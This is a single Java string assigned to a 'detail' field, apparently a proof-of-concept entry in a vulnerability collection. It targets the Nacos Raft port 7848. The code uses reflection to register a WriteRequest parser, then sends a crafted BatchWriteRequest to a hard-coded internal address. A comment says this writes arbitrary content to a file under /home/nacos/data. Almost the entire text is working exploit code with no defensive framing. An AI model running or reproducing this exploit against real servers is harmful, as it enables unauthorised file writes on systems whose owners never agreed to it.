detail = "public static void send(String addr, byte[] payload) throws Exception { Configuration conf = new Configuration(); conf.parse(addr); RouteTable.getInstance().updateConfiguration(\"nacos\", conf); CliClientServiceImpl cliClientService = new CliClientServiceImpl(); cliClientService.init(new CliOptions()); RouteTable.getInstance().refreshLeader(cliClientService, \"nacos\", 1000).isOk(); PeerId leader = PeerId.parsePeer(addr); Field parserClasses = cliClientService.getRpcClient().getClass().getDeclaredField(\"parserClasses\"); parserClasses.setAccessible(true); ConcurrentHashMap map = (ConcurrentHashMap) parserClasses.get(cliClientService.getRpcClient()); map.put(\"com.alibaba.nacos.consistency.entity.WriteRequest\", WriteRequest.getDefaultInstance()); MarshallerHelper.registerRespInstance(WriteRequest.class.getName(), WriteRequest.getDefaultInstance()); final WriteRequest writeRequest = WriteRequest.newBuilder().setGroup(\"naming_persistent_service\").setData(ByteString.copyFrom(payload)).setOperation(\"Write\").build(); Object o = cliClientService.getRpcClient().invokeSync(leader.getEndpoint(), writeRequest, 5000); System.out.println(o); } public static void main(String[] args) throws Exception { String address = \"192.168.3.153:7848\"; BatchWriteRequest request = new BatchWriteRequest(); request.append(\"1.txt\".getBytes(), \"aaaa\\n\".getBytes());//向/home/nacos/data/naming/data/1.txt写入aaaa JacksonSerializer serializer = new JacksonSerializer(); send(address, serializer.serialize(request)); }"
